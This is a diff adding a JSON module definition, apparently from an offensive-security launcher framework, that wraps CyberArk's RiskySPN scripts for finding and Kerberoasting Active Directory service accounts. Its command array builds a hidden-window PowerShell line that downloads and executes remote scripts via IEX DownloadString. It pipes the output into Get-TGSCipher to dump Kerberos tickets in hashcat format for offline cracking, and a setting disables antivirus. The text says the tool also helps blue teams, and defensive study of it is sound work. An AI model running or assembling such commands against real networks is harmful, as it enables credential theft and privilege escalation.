@@ -1,0 +1,48 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Find-PotentiallyCrackableAccounts",
+    "author": ["Matan Hart (@machosec)"],
+    "path": ["windows", "x64", "powershell", "privesc", "Find-PotentiallyCrackableAccounts.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Reveals juicy information about user accounts associated with SPN. This function queries the Active Directory and retrieve information about user accounts associated with SPN. This information could determine if a service account is potentially crackable. User accounts associated with SPN are vulnerable to offline brute-forceing and they are often (by default) configured with weak password and encryption (RC4-HMAC). Requires Active Directory authentication (domain user is enough). ",
+    "remote": "https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1",
+    "local": ["data", "src", "cyberark", "RiskySPN", "Find-PotentiallyCrackableAccounts.ps1"],
+    "options": [
+      {"name": "Domain", "value": null, "required": false, "flag": "-Domain", "description":"The name of the domain to query. \"Current\" for the user's current domain. Defualts to the entire forest."},
+      {"name": "AddGroups", "value": null, "required": false, "flag": "-AddGroups", "description":"Add additional groups to consider as sensitive "},
+      {"name": "Sensitive", "value": "true", "required": false, "flag": "-Sensitive", "description":"[Switch]Show only sensitive accounts."},
+      {"name": "Stealth", "value": "true", "required": false, "flag": "-Stealth", "description":"[Switch]Do not check service/server connectivity"},
+      {"name": "GetSPNs", "value": "true", "required": false, "flag": "-GetSPNs", "description":"[Switch]Show SPNs instead of user's data"},
+      {"name": "FullData", "value": null, "required": false, "flag": "-FullData", "description":"[Switch]Show more user data"},
+      {"name": "SPN", "value": "", "required": false, "flag": "-SPN", "description":"The name of the Service Principal Name for which to ask for Kerberos TGS. Can be parsed on the pipline."},
+      {"name": "NoQuery", "value": "", "required": false, "flag": "-NoQuery", "description":"[Switch]Do not query Acitve Directory (LDAP) to determine the user prinicipal name (UPN) which runs under the SPN."},
+      {"name": "Format", "value": "hashcat", "required": false, "flag": "-Format", "description":"Convert the output to a password cracking format. Options are Hashcat, John (John the Ripper) and Kerberoast."}
+    ],
+    "description": "RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). This module can assist blue teams to identify potentially risky SPNs as well as red teams to escalate privileges by leveraging Kerberos and Active Directory. For detailed information: http://www.cyberark.com/blog/service-accounts-weakest-link-chain/",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1');",
+      "IEX (new-object net.webclient).DownloadString('https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-TGSCipher.ps1');",
+      "Find-PotentiallyCrackableAccounts",
+      "-Verbose",
+      "{{Sensitive.Flag}}",
+      "{{Stealth.Flag}}",
+      "{{GetSPNs.Flag}}",
+      "|",
+      "Get-TGSCipher",
+      "{{Format}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
